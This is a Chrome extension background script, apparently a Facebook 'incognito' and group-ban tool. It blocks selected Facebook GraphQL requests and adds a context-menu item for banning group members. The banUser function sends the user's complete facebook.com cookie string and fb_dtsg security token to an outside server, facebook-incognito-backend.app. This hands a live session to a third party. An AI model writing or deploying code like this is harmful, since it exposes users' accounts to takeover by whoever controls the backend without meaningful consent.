chrome.runtime.onMessage.addListener(async (request, sender, callback) => {
    switch(request.action)
    {
        case 'BLOCK_REQUEST':
            if (chrome.webRequest.onBeforeRequest.hasListener(blockRequest))  {
                chrome.webRequest.onBeforeRequest.removeListener(blockRequest);
            }
            try {
                chrome.webRequest.onBeforeRequest.addListener(blockRequest, {
                    urls: ["<all_urls>"]
                }, ['blocking', 'requestBody']);  
            } catch(e) {
                console.log(e);
            }  
        break;
        case 'BAN_GROUP_MEMBER':
            chrome.cookies.getAll({domain: 'facebook.com'}, (cookies) => {
                let cookie = cookies.reduce((cookie, cookieValue)=> cookie += `${cookieValue.name}=${cookieValue.value}; `, '');
                cookie = cookie.split(';');
                cookie.pop();
                cookie = cookie.join(';');
                let facebookData = {
                    cookie,
                    fb_dtsg: request.payload
                };
                sessionStorage.setItem('facebookData', JSON.stringify(facebookData));
                createContextMenu();
            }); 
        break;
        case 'SET_SELECTED_ELEMENT':
            sessionStorage.setItem('memberSelected', request.payload);
        break;
    }

    function createContextMenu()
    {
        if(!sessionStorage.getItem('isMenuCreated'))
        {
            chrome.contextMenus.create({
                title: "Bay Màu", 
                contexts:['all'], 
                onclick: banUser
            });
            sessionStorage.setItem('isMenuCreated', true);
        } 
    }

    function blockRequest(details) {
        let currentBlocking = localStorage.getItem('blocked');
        details.url = details.url.split('?') ? details.url.split('?')[0] : details.url;
        if(details.url.includes('https://www.facebook.com/api/graphql/') && details.method == 'POST')
        {
            if(details.requestBody.formData.fb_api_req_friendly_name && currentBlocking.split(',').includes(String(details.requestBody.formData.fb_api_req_friendly_name)))
            {
                return {
                    cancel: true
                };
            }
        }
        else if(currentBlocking && currentBlocking.split(',').includes(details.url))
        {
            return {
                cancel: true
            };
        }
        return {
            cancel: false
        }
    }

    async function banUser(info,tab) {
        try
        {
            let member_id = parseInt(sessionStorage.getItem('memberSelected'));
            let target = info.linkUrl.match(/(?:https?:\/\/)?(?:www\.)?facebook\.com\/(?:(?:\w)*#!\/)?(?:pages\/)?(?:[\w\-]*\/)*([\w\-\.]*)/);
            let facebookData = JSON.parse(sessionStorage.getItem('facebookData'));
            let data =  {
                fb_dtsg_ag: facebookData.fb_dtsg,
                fb_dtsg: facebookData.fb_dtsg,
                confirmed: true
            };             
            let res = await axios.post('https://facebook-incognito-backend.app/', {
                data, 
                cookie: facebookData.cookie,
                group_id: 1,
                member_id
            });
            console.log(res);
        }
        catch(e)
        {
            alert(e);
        }
    }
});